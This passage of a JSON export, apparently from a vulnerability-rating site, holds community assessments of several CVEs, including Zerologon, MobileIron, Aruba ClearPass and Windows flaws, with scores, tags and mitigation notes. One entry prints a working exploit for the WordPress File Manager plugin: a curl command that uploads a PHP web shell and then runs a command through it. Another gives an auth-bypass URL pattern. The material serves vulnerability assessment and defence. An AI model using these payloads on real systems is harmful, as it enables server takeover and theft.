list.*\r\n\r\n- Your BIG-IP platform has a Cavium Nitrox SSL hardware acceleration card installed. Platforms with this installed include:\r\n - BIG-IP i11400-DS, i11600-DS, i11800-DS\r\n - BIG-IP 1600, 3600, 3900, 5000, 6900, 7000, 8900, 10000, 11000, 12000\r\n - VIPRION 2100, 2150, 2250, 4100, 4200, 4300\r\n\r\n#### Mitigations\r\n\r\nF5 have released a set of mitigations that will prevent this attack on vulnerable server until they can be patched. \r\n\r\n- Log in to the Configuration utility.\r\n- Go to Local Traffic > Profiles > SSL > Client.\r\n- Select the Client SSL profile.\r\n- In the Configuration list, select Advanced. \r\n- In the Options section, in the list, select Options List.\r\n- In the Options List section, under Available Options, select Single DH use, and then select Enable.\r\n- The Single DH Use option displays under Enabled Options.\r\n- In Ciphers, in the text box, enter a cipher string that disables ADH or DHE, such as the following example:\r\n`!DHE:!ADH:ALL`\r\n- In Unclean Shutdown, select Enabled.\r\n- At the bottom of the page, select Update.",
      "score": 4,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "f90457dc-8e5c-4f7e-97d4-933aa85a36a9",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "7c5703d3-9e18-4f5c-a4d2-25e1f09b43cb",
      "created": "2020-09-15T08:31:27.399609Z",
      "revisionDate": "2020-10-04T20:09:14.047932Z",
      "document": "Unauthenticated attacker, able to directly connect to a Domain Controller over [NRPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) will be able to reset the Domain Controller's account password to an empty string, thus enabling the attackers to further escalate their privileges to Domain Admin.\r\n\r\nThe exploit will be successful only if the Domain Controller uses the password stored in Active Directory to validate the login attempt, rather than the one stored locally as, when changing a password in this way, it is only changed in the AD. The targeted system itself will still locally store its original password. \r\nTarget computer will then not be able to authenticate to the domain anymore, and it can only be re-synchronized through manual action.\r\nIn test lab a successful attack broke the following functionalities when targeting a Domain Controller: DNS functionality and/or communication with replication Domain Controllers.\r\n\r\n[Checker and Exploit code](https://github.com/VoidSec/CVE-2020-1472)\r\nOriginal research and white-paper: [Secura - Tom Tervoort](https://www.secura.com/blog/zero-logon](https://www.secura.com/blog/zero-logon)\r\n",
      "score": 10,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "37311433-c5b5-43a2-8192-dfa65d273de5",
      "editorId": "fef4f8b7-2e13-4e75-8abb-75e53758f38a",
      "topicId": "7c5703d3-9e18-4f5c-a4d2-25e1f09b43cb",
      "created": "2020-09-16T15:29:52.881459Z",
      "revisionDate": "2020-09-29T20:58:49.331303Z",
      "document": "It\u2019s a pretty nasty bug that there is now weaponized POC code, and Is now available in #mimikatz. So we are expecting some impressive attacks very soon. \ud83d\ude0e\r\n\r\nFor this particular vulnerability there are three big things I want to emphasize:\r\n \r\n1\ufe0f\u20e3 The vuln requires that an attacker already has access to a network.  However, once in, this is an attack that can be done very quickly. \r\n \r\n2\ufe0f\u20e3 MS is holding fast on only patching Window Server 2008 R2 and up.  It is not 100% confirmed, but there is a good chance that earlier EOL versions of servers could be affected, that could represent a higher risk to legacy systems and applications \r\n\r\n3\ufe0f\u20e3 What\u2019s worse is that there is not a full fix available. The patch enables the DCs to protect devices, but a second patch currently slated for Q1 2021 enforces secure Remote Procedure Call (RPC) with Netlogon to fully address this bug. \r\n",
      "score": 8,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d0013e28-d39d-47bc-9b6e-59418ad1ffa5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "fa4ddd90-f786-4d87-9198-f8fec910d4db",
      "created": "2020-09-16T23:10:27.908788Z",
      "revisionDate": "2020-09-17T15:19:47.838276Z",
      "document": "This appears to be [enterprise asset management](https://en.wikipedia.org/wiki/Enterprise_asset_management) software, which would be common in, well, enterprise environments. This vulnerability is authenticated, though, so you will need to obtain creds. After that, Java deserialization RCE is typically a well-supported attack.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "20035a4c-a30d-4f15-95cb-4062860273bd",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6b5cc8e4-e6fa-46c7-810d-4b258f981a7a",
      "created": "2020-09-17T16:03:01.075693Z",
      "revisionDate": "2020-09-18T14:40:12.91912Z",
      "document": "This is **reflected** (vs. stored) XSS under _certain circumstances_, so I'm not sure how useful this is outside, say, phishing for creds - critical rating aside. Happy to be shown otherwise.",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "0933f1af-b76f-44de-9b4f-5832e55573fa",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "68f0579a-63dc-4921-9e43-85615eb52a7f",
      "created": "2020-09-18T21:01:30.175646Z",
      "revisionDate": "2020-09-24T16:56:03.444239Z",
      "document": "This vulnerability exists in the Windows Update Orchestrator service.  A scheduling API call, `ScheduleWork` does not validate the caller's permissions, but will schedule a task to be run as SYSTEM.  It is present on all version of Windows 10 and Windows Server Core.\r\nOne protection that exists is that the binary scheduled for launch must be signed by Microsoft.  Unfortunately, it appears you can bypass this restriction by passing an unsigned binary into the cmd.exe signed Windows binary as a parameter.  The only other difficulty is that an attacker cannot schedule the execution, but the schedule is determined by the service, and will take place at a time when the scheduler believes the computer will be idle.\r\nMitigations to this might include checking all scheduled jobs for any files not in the system32 directory.  The specific registry key for the jobs is located here:\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Orchestrator\\UScheduler\r\n\r\nMore information and PoC code located here: https://github.com/irsl/CVE-2020-1313\r\n",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "da985140-a873-439a-80d2-5b6fd0087a36",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "7cb9d781-d42b-49ad-8368-7833414fd76a",
      "created": "2020-09-22T20:22:33.860899Z",
      "revisionDate": "2021-01-06T21:11:24.4719Z",
      "document": "```\r\nhttps://mobileiron/mifs/.;/services/someService\r\n```\r\n\r\nThe \"[auth bypass](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html)\" relies on a discrepancy between how Apache and Tomcat parse the path component in the URI, which is the same technique that was applied to [CVE-2020-5902](https://attackerkb.com/topics/evLpPlZf0i/cve-2020-5902-tmui-rce-vulnerability).\r\n\r\n\"Bypassing authentication\" allows one to achieve RCE against either the user interface or the management interface, though it's not clear that [CVE-2020-15505](https://attackerkb.com/topics/Mo2aQDjmZ2/cve-2020-15505) is the RCE used in the [blog post](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html). This is more of an ACL bypass than an auth bypass, honestly. This was briefly mentioned in the post.\r\n\r\nSince MobileIron is [mobile device management (MDM)](https://en.wikipedia.org/wiki/Mobile_device_management) software, which is increasingly relevant as the workforce shifts toward remote work, compromising a target's MDM infrastructure may have devastating consequences.\r\n\r\nDevelopers gluing disparate pieces of software together should take care to avoid turning expected input from one software into unexpected input for another. This bug class is [well-documented](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf). In the end, even input sanitization should take care to avoid normalization bugs.\r\n\r\nGreat find, Orange!\r\n\r\nAlso see [CVE-2020-15505](https://attackerkb.com/topics/Mo2aQDjmZ2/cve-2020-15505), a MobileIron RCE.\r\n\r\n**ETA: [CVE-2020-15505](https://attackerkb.com/topics/Mo2aQDjmZ2/cve-2020-15505) uses an _ACL_ bypass, but in retrospect, I don't think it's this _auth_ bypass.** This analysis can be applied to [CVE-2020-15505](https://attackerkb.com/topics/Mo2aQDjmZ2/cve-2020-15505), consequently.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "f56a8f2e-6668-446b-9a66-ca04282bf4d2",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "353c2e5c-d0a4-444e-b1b0-b9778b7197f5",
      "created": "2020-09-23T16:55:11.756792Z",
      "revisionDate": "2021-01-06T21:20:45.664907Z",
      "document": "~~It's not actually clear this is the RCE in the [blog post](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html)~~ It's clear now, so please see [CVE-2020-15506](https://attackerkb.com/topics/nPl8YRkKRb/cve-2020-15506) for the original analysis.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3b153089-521b-4519-890e-d1a07e27e85d",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6a4a7478-6280-48e9-9d27-ad2f1bd89df4",
      "created": "2020-09-23T17:26:29.570352Z",
      "revisionDate": "2020-09-25T17:31:41.464233Z",
      "document": "> Aruba\u2019s ClearPass Policy Manager, part of the Aruba 360 Secure Fabric, provides role- and device-based secure network access control for IoT, BYOD, corporate devices, as well as employees, contractors and guests across any multivendor wired, wireless and VPN infrastructure.\r\n\r\nhttps://www.arubanetworks.com/assets/ds/DS_ClearPass_PolicyManager.pdf\r\n\r\nUnauthed RCE in NAC software. Not sure how common this one is, but it's name-brand software, so expect to see it on enterprise networks. High-impact target if compromised, since NAC is tightly integrated with the network.\r\n\r\nDetailed writeup [here](https://dozer.nz/posts/aruba-clearpass-rce).",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "f6b12a08-220d-4257-8e21-92739cbd2aa1",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "46ae5a4f-8bf9-4cf9-bb33-2cb591d7b62d",
      "created": "2020-09-23T20:20:15.331173Z",
      "revisionDate": "2020-09-24T16:56:03.449426Z",
      "document": "This was exploited in the wild as noted at https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html and https://blog.exodusintel.com/2019/05/17/windows-within-windows/",
      "score": 4,
      "metadata": {},
      "tags": []
    },
    {
      "id": "95c5dc79-d679-4a65-879a-335965c34a4f",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "434cecfe-43dc-4446-9c55-3edfd6742827",
      "created": "2020-09-24T17:14:44.149472Z",
      "revisionDate": "2020-11-13T21:13:53.044003Z",
      "document": "Whilst I agree with most of the points @bwatters-r7 makes on this one, I think it is also important to note that as of right now, there does not appear to be a patch for this vulnerability, as if one dives into the CoreSecurity pages they will see that according to CoreSecurity MSI never responded to their request. I can also confirm this by visiting https://www.msi.com/Landing/mystic-light-rgb-gaming-pc/download, and trying to download the latest version of AmbientLink, which at the time is 1.0.0.08. Looking at this ZIP file shows that it was last updated on 2019-10-14, aka October 14th 2019, and given that CoreSecurity moved to full disclosure on 2020-08-07, or August 7th 2020, I think its safe to say that this bug still hasn't been patched.\r\n\r\nAdditionally its also important to note that the driver for this software will be signed in such a way that its still trusted by Microsoft machines. Therefore so long as you have permissions to install this driver on a system, you can still gain SYSTEM level code execution on pretty much any Microsoft machine you desire.\r\n\r\nOf course the counter argument to this is really two fold. The first is that most of the time you won't have permissions to install arbitrary software on the target machine, which kind of negates the point I made earlier. Additionally to @bwatters-r7 's point, this software is going to be typically installed on a home user's gamer rig, which limits the number of users that will be affected by this bug and since gamers generally tend to like using the latest and greatest thing, they will be more inclined to apply the updates for this bug when it does get fixed.\r\n\r\nSo yeah overall feeling is that this is a medium as there is a severe impact, no patch, and working PoC's for Windows 7 and Windows 10 from CoreSecurity,",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "8487a5d9-76c4-4b0e-b342-0c61b42e0e64",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b95e8026-2c05-4f41-ac50-f16cef790e9d",
      "created": "2020-09-25T22:35:12.241921Z",
      "revisionDate": "2020-09-30T19:14:31.218179Z",
      "document": "# Analysis\r\n\r\nThe VPN client verifies that certificates are signed by a) Fortinet themselves or b) a \"trusted\" CA. The Fortinet-signed certificate does not have its server name verified, and an attacker can substitute in another Fortinet-signed certificate for use in a [man-in-the-middle (MITM) attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack).\r\n\r\nThe attacker may then be able to retrieve VPN user credentials and tokens from the captured network traffic.\r\n\r\n# Exploitability\r\n\r\nThe attacker needs a Fortinet-signed certificate as well as presence on the target's network to initiate the MITM attack.  The certificate can be obtained from another Fortinet device, and the network access can be obtained through a compromised IoT device as the researchers suggested.\r\n\r\nAll in all, exploitability is lower due to the targeted exploit chain.\r\n\r\n# Impact\r\n\r\nAn attacker may obtain VPN access to an organization's network and its services.\r\n\r\n# Recommendations\r\n\r\nVPN administrators should use only certificates that are signed by a trusted CA.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "dd58d578-ed27-4879-88f2-c240b5f89e92",
      "editorId": "859427a6-b3a2-44c8-9b91-1c7f31cdc4e7",
      "topicId": "a4c40aa9-050b-4ff2-a029-be3adc6857ca",
      "created": "2020-09-26T18:21:06.960334Z",
      "revisionDate": "2020-10-01T20:35:30.521744Z",
      "document": "The Dashboard Snapshot API allows an unauthenticated user to create dashboard snapshots. An attacker could generate enough snapshots to eventually fill up the disk on the Grafana server, causing the denial of service. \r\n\r\nMy proof of concept can be found here: https://github.com/h0ffayyy/CVE-2019-15043",
      "score": 5,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "7c4f56a6-6d1d-47bc-beef-e2023ba4c1ec",
      "editorId": "859427a6-b3a2-44c8-9b91-1c7f31cdc4e7",
      "topicId": "81c85eff-6330-4207-ad4e-1f671d07ca64",
      "created": "2020-09-26T18:29:49.039608Z",
      "revisionDate": "2020-10-01T20:35:31.609113Z",
      "document": "Fairly easy to exploit, but I wasn't able to do more than send requests from the victim server. May be useful for an attacker to recon internal infrastructure.\r\n\r\nMy POC can be seen here: https://github.com/h0ffayyy/Jira-CVE-2019-8451",
      "score": 5,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "811da624-4398-4150-95eb-4e840fbca1c6",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "aa7f75b5-85dc-4246-932b-c13a3a39b197",
      "created": "2020-09-29T20:28:08.167423Z",
      "revisionDate": "2020-11-10T21:30:41.31912Z",
      "document": "Confirming I was able to reproduce this vuln when it became known.\r\n\r\nETA PoC:\r\n\r\n```\r\nwvu@kharak:~$ curl -s http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php -F cmd=upload -F target=l1_ -F \"upload[]=@-; filename=x.php\" <<<'<?php passthru($_REQUEST[\"c\"]); ?>' | jq\r\n{\r\n  \"added\": [\r\n    {\r\n      \"isowner\": false,\r\n      \"ts\": 1599193366,\r\n      \"mime\": \"text/x-php\",\r\n      \"read\": 1,\r\n      \"write\": 1,\r\n      \"size\": \"35\",\r\n      \"hash\": \"l1_eC5waHA\",\r\n      \"name\": \"x.php\",\r\n      \"phash\": \"l1_Lw\",\r\n      \"url\": \"/wp-content/plugins/wp-file-manager/lib/php/../files/x.php\"\r\n    }\r\n  ],\r\n  \"removed\": [],\r\n  \"changed\": [\r\n    {\r\n      \"isowner\": false,\r\n      \"ts\": 1599193366,\r\n      \"mime\": \"directory\",\r\n      \"read\": 1,\r\n      \"write\": 1,\r\n      \"size\": 0,\r\n      \"hash\": \"l1_Lw\",\r\n      \"name\": \"files\",\r\n      \"phash\": \"l1_L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtZmlsZS1tYW5hZ2VyL2xpYg\",\r\n      \"volumeid\": \"l1_\",\r\n      \"locked\": 1\r\n    }\r\n  ]\r\n}\r\nwvu@kharak:~$ curl http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/files/x.php -d c=id\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\nwvu@kharak:~$\r\n```\r\n\r\nThe first HTTP request uploads the PHP payload, and the second one executes it.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "31f29976-23ae-42a6-947a-d69030d7c668",
      "editorId": "e249f6d6-8ad6-479b-ad30-71bac68a4f71",
      "topicId": "63a96584-6094-4433-8ae0-1c1cd1b1c345",
      "created": "2020-09-30T15:37:05.323879Z",
      "revisionDate": "2020-11-01T13:04:45.180961Z",
      "document": "Nothing valuable was exposed by vulnerability, also it was not possible to expand the scope or weaponize it.\r\nThis module was also tested with no success: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/http/cisco_directory_traversal.md\r\nPoC: https://twitter.com/aboul3la/status/1286012324722155525\r\nhttps://www.youtube.com/watch?v=74ExOh6BVxk\r\n\r\nFile Entry Points:\r\n\r\nlogo.gif\r\nhttp_auth.html\r\nuser_dialog.html\r\nlocalization_inc.lua\r\nportal_inc.lua\r\ninclude\r\nnostcaccess.html\r\nask.html\r\nno_svc.html\r\nsvc.html\r\nsession.js\r\nuseralert.html\r\nping.html\r\nhelp\r\napp_index.html\r\ntlbr\r\nportal_forms.js\r\nlogon_forms.js\r\nwin.js\r\nportal.css\r\nportal.js\r\nsess_update.html\r\nblank.html\r\nnoportal.html\r\nportal_ce.html\r\nportal.html\r\nhome\r\nlogon_custom.css\r\nportal_custom.css\r\npreview.html\r\nsession_expired\r\ncustom\r\nportal_elements.html\r\ncommonspawn.js\r\ncommon.js\r\nappstart.js\r\nappstatus\r\nrelaymonjar.html\r\nrelaymonocx.html\r\nrelayjar.html\r\nrelayocx.html\r\nportal_img\r\ncolor_picker.js\r\ncolor_picker.html\r\ncedhelp.html\r\ncedmain.html\r\ncedlogon.html\r\ncedportal.html\r\ncedsave.html\r\ncedf.html\r\nced.html\r\nlced.html\r\nfiles\r\npluginlib.js\r\nshshim\r\ndo_url\r\nclear_cache\r\nconnection_failed_form\r\napcf\r\nucte_forbidden_data\r\nucte_forbidden_url\r\ncookie\r\nsession_password.html\r\ntunnel_linux.jnlp\r\ntunnel_mac.jnlp\r\nsdesktop\r\ngp-gip.html\r\nauth.html\r\nwrong_url.html\r\nlogon_redirect.html\r\nlogout.html\r\nlogon.html\r\ntest_chargen",
      "score": 7,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "4d78b22f-4f1d-41ba-8e46-d1df35f64abf",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "fb2f65b2-d10b-4622-aee6-41aad3c1e6e7",
      "created": "2020-10-05T22:35:42.376112Z",
      "revisionDate": "2020-10-06T23:23:32.749819Z",
